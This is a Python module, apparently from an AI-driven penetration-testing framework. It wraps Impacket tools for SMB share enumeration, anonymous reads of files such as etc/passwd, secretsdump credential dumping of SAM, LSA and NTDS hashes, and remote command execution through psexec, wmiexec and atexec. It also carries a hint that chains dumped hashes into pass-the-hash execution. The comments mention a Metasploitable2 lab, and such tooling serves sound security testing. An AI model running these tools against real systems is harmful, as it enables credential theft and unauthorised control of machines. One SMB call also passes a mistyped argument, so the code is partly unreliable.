# Impacket suite: SMB enumeration plus Windows remote-exec and secret dumping.
#
# Two categories of tools, both BRAIN_DISPATCH:
#
# 1. Programmatic SMB (works against Samba AND Windows):
#    - smb_enum_shares  - list shares and probe read access
#    - smb_read_file    - read a file from an accessible share
#
# 2. Impacket example-script wrappers (subprocess, argv - never a shell):
#    - secretsdump   - dump SAM/LSA/NTDS secrets   (Windows targets)
#    - psexec_exec   - run one command via RemCom   (Windows targets)
#    - wmiexec_exec  - run one command via WMI     (Windows targets)
#    - atexec_exec   - run one command via the Task Scheduler (Windows)
#
# The wrappers invoke impacket console scripts with an argv list and
# shell=False, so target/credential values are never interpolated into a
# shell. -no-pass is added when no password is supplied so impacket never
# blocks on an interactive password prompt (which would hang a dispatch
# worker thread). stdin is wired to DEVNULL for the same reason.
#
# All functions are deliberately synchronous: both dispatchers run sync
# tools in a worker thread (run_in_executor / asyncio.to_thread). Making
# these async would pin blocking subprocess / socket calls to the loop.
#
# TARGET COMPATIBILITY: remote-exec and secretsdump target Windows
# services (Service Control Manager, WMI, Task Scheduler, the SAM/SYSTEM
# hives). They do NOT work against Samba-only hosts such as
# Metasploitable2; against Samba they fail with a protocol error. The
# programmatic SMB tools DO work against Samba - those are the winnable
# steps on a Samba target.
#
# NOTE: this is a comment block, not a module docstring, so the static
# discovery pass does not mint a no-op LOCAL_FILE manifest for the file.



import shlex
import shutil
import subprocess

from constants import framework_tool
from impacket.smb import FILE_READ_DATA, FILE_SHARE_READ
from impacket.smbconnection import SMBConnection


# --- shared helpers ------------------------------------------------------

def _target_string(target, username, password, domain):
    """Build impacket's [[domain/]username[:password]@]<target> arg."""
    if not username:
        # anonymous / null session: bare address (caller adds -no-pass)
        return target
    user = f"{domain}/{username}" if domain else username
    if password:
        return f"{user}:{password}@{target}"
    return f"{user}@{target}"


def _impacket_argv(script, target, command, username, password, domain, extra):
    """Build the argv list for an impacket example script (no shell)."""
    binary = shutil.which(script) or script
    argv = [binary]
    # Always avoid an interactive password prompt that would hang the worker.
    if not password:
        argv.append("-no-pass")
    if extra:
        argv.extend(shlex.split(extra))
    argv.append(_target_string(target, username, password, domain))
    if command:
        argv.extend(shlex.split(command) if isinstance(command, str) else list(command))
    return argv


def _run_impacket(argv, timeout=300):
    """Run an impacket script with stdin closed; never raise to the caller."""
    try:
        result = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
        )
        if result.returncode == 0:
            return result.stdout
        # Non-zero exit still carries useful output (e.g. protocol errors
        # against Samba). Surface both streams so the operator can diagnose.
        return f"{result.stdout}\n[{argv[0]} exit {result.returncode}] {result.stderr}".strip()
    except subprocess.TimeoutExpired:
        return f"{argv[0]} timed out after {timeout}s"
    except FileNotFoundError:
        return f"{argv[0]} not found; install impacket in the framework venv"
    except Exception as e:
        return f"Error running {argv[0]}: {e}"


# --- programmatic SMB (works on Samba) -----------------------------------

@framework_tool("Enumerate SMB shares on a target and report read access for each (works against Samba and Windows).")
def smb_enum_shares(target, username="", password="", domain=""):
    """List SMB shares on a target and probe read access for each.

    Uses a null (anonymous) session when username is empty, otherwise logs
    in with the supplied credentials. Works against both Windows SMB and
    Samba - this is the winnable impacket step on a Samba target like
    Metasploitable2.

    Args:
        target: IP or hostname of the SMB host.
        username: SMB username; empty for anonymous / null session.
        password: SMB password; empty for null session.
        domain: Windows domain (ignored by most Samba setups).
    """
    try:
        conn = SMBConnection(target, target, remoteByName=False, timeout=10)
        if username:
            conn.login(username, password, domain)
        else:
            conn.login("", "")  # null session
        shares = conn.listShares()
        lines = []
        for share in shares:
            name = share.get("shi1_netname", "").rstrip("\x00")
            remark = share.get("shi1_remark", "").rstrip("\x00")
            access = "no-access"
            try:
                tid = conn.connectTree(name)
                access = "read"
                conn.disconnectTree(tid)
            except Exception:
                pass
            lines.append(f"{name}\tremark={remark!r}\t[{access}]")
        conn.logoff()
        return "\n".join(lines) if lines else f"No shares enumerated on {target}."
    except Exception as e:
        return f"SMB enumeration error: {e}"


@framework_tool("Read a file from an SMB share on a target (works against Samba and Windows).")
def smb_read_file(target, share, path, username="", password="", domain="", max_bytes=65536):
    """Read a single file from an SMB share.

    Returns up to max_bytes of the file as decoded text (utf-8, replace).
    Use smb_enum_shares first to find a readable share.

    Args:
        target: IP or hostname of the SMB host.
        share: Share name (e.g. "C$" or a Samba share like "tmp").
        path: Path to the file within the share (e.g. "etc/passwd").
        username: SMB username; empty for anonymous / null session.
        password: SMB password; empty for null session.
        domain: Windows domain.
        max_bytes: Cap on bytes read so a huge file can't drown the chat.
    """
    try:
        conn = SMBConnection(target, target, remoteName=False, timeout=10)
        if username:
            conn.login(username, password, domain)
        else:
            conn.login("", "")
        tid = conn.connectTree(share)
        fid = conn.openFile(
            tid,
            path,
            desiredAccess=FILE_READ_DATA,
            shareMode=FILE_SHARE_READ,
        )
        offset = 0
        chunks = []
        total = 0
        while total < max_bytes:
            data = conn.readFile(tid, fid, offset, 8192)
            if not data:
                break
            chunks.append(data)
            total += len(data)
            offset += len(data)
        conn.closeFile(tid, fid)
        conn.disconnectTree(tid)
        conn.logoff()
        body = b"".join(chunks).decode("utf-8", errors="replace")
        if total >= max_bytes:
            body += f"\n...[truncated at {max_bytes} bytes]"
        return body or "(empty file)"
    except Exception as e:
        return f"SMB read error: {e}"


# --- impacket example-script wrappers (Windows targets) ------------------

@framework_tool(
    "Dump SAM/LSA/NTDS secrets from a Windows target using impacket's secretsdump.",
    next_hints=["psexec_exec with -hashes :<NTLM>", "report_finding"],
)
def secretsdump(target, username="", password="", domain="", extra_options=""):
    """Run impacket secretsdump.py against a Windows target.

    Dumps local SAM hashes, LSA secrets, and (against a DC) NTDS hashes.
    Remote mode requires Windows (a real SAM/registry); against a Samba host
    it will fail with a protocol error - that is expected, not a bug.

    Args:
        target: Windows host IP/hostname.
        username: Account with local-admin or DC rights on the target.
        password: Account password (empty -> -no-pass, used with hashes/kerb).
        domain: Windows domain.
        extra_options: Extra secretsdump flags, e.g. "-just-dc -hashes :NTLM".
    """
    argv = _impacket_argv("secretsdump.py", target, None, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=600)


@framework_tool("Run a single command on a Windows target via impacket psexec (RemCom service).")
def psexec_exec(target, command, username="", password="", domain="", extra_options=""):
    """Run one command on a Windows target via impacket's psexec.py.

    Installs a temporary service via the Service Control Manager, executes
    the command, and returns captured stdout. Requires a Windows target
    with SMB and SCM; against Sama it fails (Samba has no SCM).

    Args:
        target: Windows host IP/hostname.
        command: The command to execute on the target (e.g. "whoami" or "ipconfig /all").
        username: Windows account with local-admin rights.
        password: Account password (empty -> -no-pass).
        domain: Windows domain.
        extra_options: Extra psexec flags, e.g. "-service-name X".
    """
    if not command:
        return "psexec_exec requires a command."
    argv = _impacket_argv("psexec.py", target, command, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=300)


@framework_tool("Run a single command on a Windows target via WMI (impacket wmiexec).")
def wmiexec_exec(target, command, username="", password="", domain="", extra_options=""):
    """Run one command on a Windows target via impacket's wmiexec.py.

    Uses Windows Management Instrumentation (no service install). Requires
    a Windows target with WMI enabled; against Samba it fails.

    Args:
        target: Windows host IP/hostname.
        command: The command to execute on the target.
        username: Windows account.
        password: Account password (empty -> -no-pass).
        domain: Windows domain.
        extra_options: Extra wmiexec flags, e.g. "-silentcommand".
    """
    if not command:
        return "wmiexec_exec requires a command."
    argv = _impacket_argv("wmiexec.py", target, command, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=300)


@framework_tool("Run a single command on a Windows target via the Task Scheduler (impacket atexec).")
def atexec_exec(target, command, username="", password="", domain="", extra_options=""):
    """Run one command on a Windows target via impacket's atexec.py.

    Schedules a one-shot task via the Task Scheduler service and captures
    output. Requires a Windows target with the Task Scheduler service;
    against Samba it fails.

    Args:
        target: Windows host IP/hostname.
        command: The command to execute on the target.
        username: Windows account.
        password: Account password (empty -> -no-pass).
        domain: Windows domain.
        extra_options: Extra atexec flags, e.g. "-session-id 1".
    """
    if not command:
        return "atexec_exec requires a command."
    argv = _impacket_argv("atexec.py", target, command, username, password, domain, extra_options)
    return _run_impacket(argv, timeout=300)
